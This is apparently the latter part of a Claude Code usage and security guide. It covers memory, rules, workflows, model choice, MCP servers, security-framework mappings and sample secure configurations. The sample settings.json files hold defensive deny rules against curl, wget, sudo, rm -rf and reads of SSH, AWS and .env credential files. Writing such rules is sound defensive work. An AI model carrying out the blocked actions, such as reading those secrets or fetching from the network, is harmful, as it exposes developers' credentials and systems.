| Team-wide constraints | Cross-session patterns |
| Active task tracking | Solutions to recurring problems |
| Build/test instructions | "Always use X instead of Y" |

CLAUDE.md is for the **project** (shared, checked in). Auto memory is for the **developer** (local, personal).

### 11.6 `.claude/rules/` — Organised, Scoped Instructions

For projects with many rules, split them into topic files:

```
.claude/rules/
├── security.md          # Always loaded
├── testing.md           # Always loaded
├── code-style.md        # Always loaded
└── api/
    └── validation.md    # Loaded only when Claude reads src/api/ files
```

**Path-scoped rules** only load when relevant (saves context):

```markdown
---
paths:
  - "src/api/**/*.ts"
---

# API Rules
- All endpoints validated with zod schemas
- Return RFC 7807 problem details on error
- Rate limit: 100 req/min per user
```

### 11.7 Keeping Claude Grounded in Reality

The biggest risk isn't Claude forgetting — it's Claude **remembering wrong**. Claude may hallucinate file paths, function signatures, or project structure based on patterns from training data instead of your actual codebase.

**Prevention strategies:**

1. **Explore first, code second.** Start sessions with `plan` mode or ask Claude to read relevant files before making changes.

2. **Reference actual files, not descriptions.**
   ```
   # Bad — Claude may hallucinate the structure
   "Update the user validation in the auth module"

   # Good — Claude reads the actual file
   "Read src/auth/validate.ts, then update the email validation"
   ```

3. **Use `@file` imports in CLAUDE.md** to point at real files:
   ```markdown
   See @src/config/env.ts for environment variable schema.
   See @package.json for available scripts.
   ```

4. **Provide verification, not just instructions.**
   ```
   # Bad — no way to verify correctness
   "Add a rate limiter"

   # Good — self-verifying task
   "Add a rate limiter to /api/v1/users. It should return 429 after 100 requests
   per minute. Write a test that verifies this. Run the tests."
   ```

5. **After 2 failed corrections, start over.** Context polluted with failed approaches causes compounding errors. `/clear` and write a better initial prompt.

6. **Use `/context` to check context usage.** Stale assumptions accumulate in the window — check regularly.

7. **Check `/mcp` for context cost.** MCP servers add tool definitions that consume space before you start working. Disable servers you're not actively using.

### 11.8 Workflow for Long Tasks

For tasks spanning multiple sessions:

```
Session 1: Explore and plan
├── Use plan mode
├── Read relevant files
├── Ask Claude to write the plan to CLAUDE.md under "## Active Work"
└── /rename "auth-migration-plan"

Session 2: Implement phase 1
├── claude --resume auth-migration-plan (or start fresh — CLAUDE.md has the plan)
├── Implement, test
├── Update CLAUDE.md checkboxes: [x] done, [ ] remaining
├── /compact focus on completed work and remaining tasks
└── /rename "auth-migration-impl"

Session 3: Implement phase 2
├── claude -c (continue) or fresh start
├── CLAUDE.md has current state — Claude knows what's done
├── Continue implementation
└── Commit when done
```

**Key insight**: Update `CLAUDE.md` during the session, not after. If context compresses mid-task, the file on disk reflects reality.

---

## 12. Usage Tips & Performance

Beyond security, these tips help you get better results faster and reduce costs.

### 12.1 Plan Mode — Think Before Coding

Use Plan Mode for complex tasks. Skip it for one-line fixes.

```bash
claude --permission-mode plan    # start in plan mode
```

Or press `Shift+Tab` during a session to toggle modes.

**The workflow:**
1. Enter Plan Mode (read-only — Claude can't modify anything)
2. Ask: *"Create a detailed plan for adding OAuth2 support"*
3. Press `Ctrl+G` to open the plan in your text editor — edit inline, add constraints
4. Switch to Normal Mode (`Shift+Tab`)
5. *"Implement the plan"*

### 12.2 Extended Thinking

Extended thinking lets Claude reason internally before responding. Worth it for complex tasks, wasteful for simple ones.

**Toggle during session:** `Option+T` (macOS) / `Alt+T`

**Adjust effort level:** `/model` then use arrow keys

| Level | Use For |
|-------|---------|
| **Low** | Simple edits, renames, boilerplate |
| **Medium** (default) | Typical coding |
| **High** | Architecture, deep debugging, complex refactors |

**Trigger high effort ad-hoc:** Include "ultrathink" in your prompt.

### 12.3 Model Selection

```
/model    # switch during session, arrow keys to adjust effort
```

| Model | Best For | Cost |
|-------|----------|------|
| **sonnet** | Daily coding (default) | Low |
| **opus** | Complex reasoning, architecture, deep debugging | Higher |
| **haiku** | Quick questions, subagent tasks | Lowest |
| **sonnet[1m]** | Long sessions with large codebases (1M context) | Higher beyond 200K |

**Rule of thumb:** Start with Sonnet. Switch to Opus when you need deeper reasoning. Use Haiku for subagents.

### 12.4 Custom Subagents

Beyond the built-in subagents used for context isolation (see [Section 11.3](#113-surviving-context-compression)), you can create custom ones in `.claude/agents/code-reviewer.md`:

```yaml
---
name: code-reviewer
description: Expert code review
tools: Read, Grep, Glob
model: sonnet
---

Review code changes for quality, security, and best practices.
Run git diff to see changes, then review each modified file.
```

Invoke with: *"Use the code-reviewer to check my changes"*

### 12.5 Headless / Non-Interactive Mode

Use `-p` for automation, CI/CD, and scripting:

```bash
# One-off query
claude -p "Explain what this project does"

# With structured output
claude -p "List all API endpoints" --output-format json

# Enforce JSON schema
claude -p "Extract function names" \
  --output-format json \
  --json-schema '{"type":"object","properties":{"functions":{"type":"array","items":{"type":"string"}}}}'

# Pipe data in
cat error.log | claude -p "Find the root cause"

# CI/CD with tool allowlist
claude -p "Run tests and fix failures" \
  --allowedTools "Bash(npm run *),Read,Edit"
```

### 12.6 Custom Skills (Slash Commands)

Create reusable workflows as skills.

**Example — commit helper** (`~/.claude/skills/smart-commit/SKILL.md`):
```yaml
---
name: smart-commit
description: Create a descriptive commit from staged changes
disable-model-invocation: true
---

Analyze staged changes with `git diff --cached`.
Write a commit message:
- Subject: imperative verb, under 50 chars
- Body: explain why, not how
Create the commit.
```

Invoke with `/smart-commit`.

**Skills with arguments** (`.claude/skills/migrate/SKILL.md`):
```yaml
---
name: migrate
description: Migrate a component between frameworks
---

Migrate $0 from $1 to $2. Preserve behaviour and tests.
```

Invoke: `/migrate SearchBar React Vue`

### 12.7 MCP Servers for Productivity

Beyond security proxying, MCP servers give Claude access to external tools:

```bash
# GitHub — issues, PRs, code search
claude mcp add --transport http github https://api.githubcopilot.com/mcp/

# Sentry — error monitoring
claude mcp add --transport http sentry https://mcp.sentry.dev/mcp

# PostgreSQL — query databases
claude mcp add --transport stdio db \
  --env DATABASE_URL="postgresql://readonly:pass@host/db" \
  -- npx -y @bytebase/dbhub --dsn "$DATABASE_URL"

# Playwright — browser automation
claude mcp add --transport stdio playwright \
  -- npx -y @playwright/mcp@latest
```

**Manage servers:**
```bash
claude mcp list              # list all
/mcp                         # manage in-session, see context cost per server
```

**Tip:** Disable MCP servers you're not actively using — each one adds tool definitions that consume context.

### 12.8 Keyboard Shortcuts Reference

**Navigation & Control:**

| Shortcut | Action |
|----------|--------|
| `Ctrl+C` | Cancel generation |
| `Ctrl+G` | Open prompt/plan in your text editor |
| `Ctrl+O` | Toggle verbose mode (see thinking) |
| `Ctrl+B` | Background current task |
| `Ctrl+F` (x2) | Kill background agents |
| `Esc` `Esc` | Rewind / undo |
| `Shift+Tab` | Cycle permission modes |
| `Option+P` / `Alt+P` | Switch models |
| `Option+T` / `Alt+T` | Toggle extended thinking |

**Input:**

| Shortcut | Action |
|----------|--------|
| `Option+Enter` (macOS) | New line in prompt |
| `Shift+Enter` (iTerm2/Warp) | New line in prompt |
| `\` + `Enter` | New line (universal) |
| `Ctrl+K` | Delete to end of line |
| `Ctrl+U` | Delete entire line |

**Quick prefixes:**

| Prefix | Purpose |
|--------|---------|
| `/` | Slash commands and skills |
| `!` | Run bash command directly |
| `@` | File/folder mention autocomplete |
| `/btw` | Side question (doesn't add to history) |

### 12.9 Cost Optimisation

```bash
/cost       # see token usage and cost
/context    # see what's consuming context space
```

**Strategies ranked by impact:**

1. **`/clear` between unrelated tasks** and **`/compact` proactively** (see [Section 11.3](#113-surviving-context-compression))
2. **Use Sonnet by default** — switch to Opus only when reasoning depth matters
3. **Delegate verbose operations to subagents** — test output stays in their context, not yours
4. **Disable unused MCP servers** — `/mcp` to check per-server context cost
5. **Move specialised instructions to skills** — they load on-demand instead of every session
6. **Lower effort level for simple tasks** — `/model` → arrow keys
7. **Install code intelligence plugins** for typed languages — precise "go to definition" instead of grep searches

**Typical costs:** ~$6/developer/day average, <$12/day at 90th percentile.

### 12.10 Git Workflows

**Commits:**
```
"Create a descriptive commit for my staged changes"
```

Claude follows conventional commits if detected, writes subject + body, explains why not how.

**Pull Requests:**
```
"Create a PR for this feature"
```

Claude uses `gh pr create` with a summary of all commits on the branch.

**Parallel work with worktrees:**
```bash
claude --worktree feature-auth    # isolated copy of repo
```

Each worktree has its own files, branch, and Claude session — prevents conflicts between parallel tasks.

### 12.11 Image and Screenshot Input

**Add images:** drag-and-drop into the terminal, paste with `Ctrl+V`/`Cmd+V`, or reference a path.

**UI development workflow:**
```
[paste screenshot of design mockup]
"Implement this design. When done, take a screenshot and compare.
List differences and fix them."
```

**Error debugging:**
```
[paste screenshot of error]
"What's causing this? Fix it."
```

**PDFs:**
```
"Read pages 5-10 of @docs/spec.pdf and summarise the API requirements"
```

### 12.12 Common Pitfalls and Fixes

See also [Section 11.7](#117-keeping-claude-grounded-in-reality) for anti-hallucination strategies.

| Pitfall | Symptom | Fix |
|---------|---------|-----|
| **Bloated CLAUDE.md** | Claude ignores important rules | Keep under 200 lines; move details to `.claude/rules/` or skills |
| **Trust gap** | Plausible code that doesn't work | Always provide tests or verification commands |
| **Infinite exploration** | Claude reads 50+ files | Scope narrowly or delegate to subagent |
| **MCP bloat** | Context used up before you start | `/mcp` to disable servers you're not using |

---

## 13. Security Frameworks Reference

### 13.1 NIST AI Risk Management Framework (AI RMF 1.0)

Four core functions:

| Function | Application to Claude Code |
|----------|---------------------------|
| **GOVERN** | Define acceptable-use policies for AI coding tools; assign oversight roles |
| **MAP** | Document what data flows to Claude, what it can access, stakeholder impacts |
| **MEASURE** | Track metrics: vulnerabilities introduced, secret exposures, false suggestions |
| **MANAGE** | Deploy controls (this guide), define incident response for AI security events |

### 13.2 NIST SP 800-53 Rev. 5 — Key Controls

| Control | Title | Application |
|---------|-------|-------------|
| **AC-2** | Account Management | Manage identities/tokens for AI tools and MCP servers |
| **AC-3** | Access Enforcement | Permission deny/allow rules for filesystem, network, tools |
| **AC-5** | Separation of Duties | AI generates code, human reviews and approves |
| **AC-6** | Least Privilege | Grant only minimum permissions needed per task |
| **AU-2** | Event Logging | Log all tool invocations via hooks and OpenTelemetry |
| **AU-3** | Audit Record Content | Capture who, what, when, result for each AI action |
| **AU-6** | Audit Review | Regularly review session transcripts and audit logs |
| **CM-7** | Least Functionality | Disable unused features; restrict to approved tools |
| **SC-7** | Boundary Protection | Sandbox network/filesystem boundaries |
| **SI-3** | Malicious Code Protection | SAST/DAST scanning on AI-generated code |
| **SI-10** | Input Validation | Review AI outputs before integration |
| **SR-3** | Supply Chain Controls | Assess MCP servers, model providers, plugins |

### 13.3 ISO/IEC 42001:2023 — AI Management System

The first certifiable AI management system standard:

- **Clause 6 (Planning)**: Conduct AI-specific risk assessments for coding tools — what can go wrong, what data is exposed
- **Clause 8 (Operation)**: 38 controls covering data governance, model operations, third-party oversight
- **Clause 9 (Performance Evaluation)**: Monitor AI tool usage metrics, conduct internal audits
- **Clause 10 (Improvement)**: Continual improvement based on incidents and near-misses

### 13.4 ISO/IEC 27001/27002 — Information Security Controls

| Control | Application |
|---------|-------------|
| **A.5.1** | Policies explicitly addressing AI tool usage and data handling |
| **A.8.2** | Privileged access management for tools that execute code |
| **A.8.3** | Restrict information the AI can access — exclude secrets, PII |
| **A.8.9** | Secure configuration management for AI tools |
| **A.8.25-A.8.31** | Secure development lifecycle for AI-generated code |
| **A.5.19-A.5.22** | Supplier relationship security for AI tool vendors |
| **A.6.3** | Developer training on AI tool risks |

### 13.5 OWASP Top 10 for LLM Applications (2025)

| # | Risk | Mitigation in Claude Code |
|---|------|---------------------------|
| **LLM01** | Prompt Injection | Sandbox (OS-level), permission deny rules, hooks validation |
| **LLM02** | Sensitive Info Disclosure | Secret deny rules, MCP proxying, env vars |
| **LLM03** | Supply Chain | Vet MCP servers, managed settings, vendor assessment |
| **LLM04** | Data/Model Poisoning | Human code review, SAST scanning |
| **LLM05** | Improper Output Handling | Code review, automated tests, SAST |
| **LLM06** | Excessive Agency | Least-privilege permissions, sandbox, hooks |
| **LLM07** | System Prompt Leakage | Managed CLAUDE.md, don't put secrets in prompts |
| **LLM09** | Misinformation | Human review, tests, `plan` mode for exploration |
| **LLM10** | Unbounded Consumption | Session monitoring, timeout configuration |

### 13.6 Zero Trust Principles for AI Agents

Based on CSA Agentic Trust Framework:

1. **Never trust, always verify** — every tool invocation requires authorisation
2. **Agent identity** — each AI session gets scoped credentials, not shared admin tokens
3. **Fine-grained access** — context-aware decisions (time, data sensitivity, task scope)
4. **Micro-segmentation** — restrict AI to specific repos, services, network segments
5. **Continuous validation** — re-authorise at each action, not once per session
6. **Assume breach** — design controls assuming the AI or its channel could be compromised

---

## 14. Quick-Start Secure Configuration

### Minimum Viable Security (Individual Developer)

`.claude/settings.json`:
```json
{
  "permissions": {
    "allow": [
      "Read",
      "Bash(npm run *)",
      "Bash(git status)",
      "Bash(git log *)",
      "Bash(git diff *)"
    ],
    "deny": [
      "Read(./.env*)",
      "Read(~/.aws/**)",
      "Read(~/.ssh/**)",
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(sudo *)"
    ]
  },
  "defaultMode": "acceptEdits"
}
```

### Recommended Security (Team)

`.claude/settings.json` (committed to repo):
```json
{
  "permissions": {
    "allow": [
      "Read",
      "Bash(npm run *)",
      "Bash(npx tsc *)",
      "Bash(git status)",
      "Bash(git log *)",
      "Bash(git diff *)",
      "Bash(git add *)",
      "Bash(git commit *)"
    ],
    "deny": [
      "Read(./.env*)",
      "Read(./secrets/**)",
      "Read(~/.aws/**)",
      "Read(~/.ssh/**)",
      "Edit(./.env*)",
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(sudo *)",
      "Bash(rm -rf *)",
      "Bash(git push --force*)",
      "Bash(git push origin :*)"
    ]
  },
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "filesystem": {
      "denyWrite": ["//etc", "//usr/bin", "//usr/local/bin"],
      "denyRead": ["~/.aws/credentials", "~/.ssh"]
    },
    "network": {
      "allowedDomains": [
        "github.com",
        "*.npmjs.org",
        "api.anthropic.com",
        "registry.yarnpkg.com"
      ]
    }
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/security-validator.sh"
          }
        ]
      }
    ]
  }
}
```

### Maximum Security (Enterprise/Regulated)

Add to the above:
- Managed settings deployed via system-level config (cannot be overridden)
- `"disableBypassPermissionsMode": "disable"`
- HTTP audit hooks to central SIEM
- OpenTelemetry metrics export
- DevContainer with custom firewall for all development
- Mandatory human code review for all AI-generated changes
- SAST/DAST scanning in CI pipeline

---

## 15. References

### Standards & Frameworks
- [NIST AI Risk Management Framework (AI RMF 1.0)](https://www.nist.gov/itl/ai-risk-management-framework)
- [NIST SP 800-53 Rev. 5 — Security and Privacy Controls](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final)
- [ISO/IEC 42001:2023 — AI Management Systems](https://www.iso.org/standard/42001)
- [ISO/IEC 27001:2022 — Information Security Management](https://www.iso.org/standard/27001)
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/)
- [CSA Agentic Trust Framework — Zero Trust for AI Agents](https://cloudsecurityalliance.org/blog/2026/02/02/the-agentic-trust-framework-zero-trust-governance-for-ai-agents)

### Claude Code Documentation
- [Claude Code Permissions](https://docs.anthropic.com/en/docs/claude-code/security)
- [Claude Code Sandbox](https://docs.anthropic.com/en/docs/claude-code/security#sandbox)
- [Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks)
- [Claude Code MCP Servers](https://docs.anthropic.com/en/docs/claude-code/mcp)
- [Claude Code Best Practices](https://docs.anthropic.com/en/docs/claude-code/best-practices)
- [Claude Code Memory](https://docs.anthropic.com/en/docs/claude-code/memory)
- [Claude Code CLI Reference](https://docs.anthropic.com/en/docs/claude-code/cli-reference)
- [Claude Code Subagents](https://docs.anthropic.com/en/docs/claude-code/sub-agents)
- [Claude Code Skills](https://docs.anthropic.com/en/docs/claude-code/skills)

### Additional Resources
- [OpenSSF Security-Focused Guide for AI Code Assistant Instructions](https://best.openssf.org/Security-Focused-Guide-for-AI-Code-Assistant-Instructions)
- [AWS Well-Architected: Least Privilege for Agentic Workflows](https://docs.aws.amazon.com/wellarchitected/latest/generative-ai-lens/gensec05-bp01.html)
- [NIST AI RMF Playbook](https://airc.nist.gov/airmf-resources/playbook/)
- [How to Secure AI Coding Assistants — Knostic](https://www.knostic.ai/blog/ai-coding-assistant-security)
- [Least Privilege for AI Operations — Nightfall AI](https://www.nightfall.ai/ai-security-101/least-privilege-principle-in-ai-operations)
- [Best Practices for Authorizing AI Agents — Oso](https://www.osohq.com/learn/best-practices-of-authorizing-ai-agents)
- [Zero Trust Agent Architecture — Microsoft](https://techcommunity.microsoft.com/blog/educatordeveloperblog/zero-trust-agent-architecture-how-to-actually-secure-your-agents/4473995)
